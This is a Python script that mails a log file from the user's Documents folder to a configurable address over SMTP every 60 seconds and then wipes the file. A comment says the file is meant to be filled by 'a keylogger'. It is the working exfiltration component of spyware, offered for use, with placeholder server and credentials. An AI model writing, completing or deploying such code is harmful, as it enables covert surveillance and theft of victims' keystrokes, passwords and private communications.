import os
import smtplib
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
import time


def mail_logfile(logfile_path, logfile_name):

    smtp_server = "smtp server address here, for example: smtp.office365.com"
    # port varies depending on smtp server
    smtp_port = 587
    smtp_username = "Email address or username here"
    smtp_password = "Email password here"
    from_email = "From Email address here"
    to_email = "To Email address here"

    msg = MIMEMultipart()
    msg['Subject'] = 'Subject of sent email here'
    msg['From'] = from_email
    msg['To'] = to_email

    with open(logfile_path, "rb") as f:
        attachment = MIMEApplication(f.read())
        attachment.add_header('Content-Disposition', 'attachment', filename=logfile_name)
        msg.attach(attachment)

    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(from_email, to_email, msg.as_string())


if __name__ == '__main__':
    logfile_path = os.path.join(os.environ['USERPROFILE'], 'Documents', 'logfiles.txt')
    logfile_name = 'logfiles.txt'

    # additional code to fill the logfiles.txt HERE, for example a keylogger

    while True:
        time.sleep(60)
        mail_logfile(logfile_path, logfile_name)
        with open(logfile_path, "w") as logfile:
            logfile.truncate()
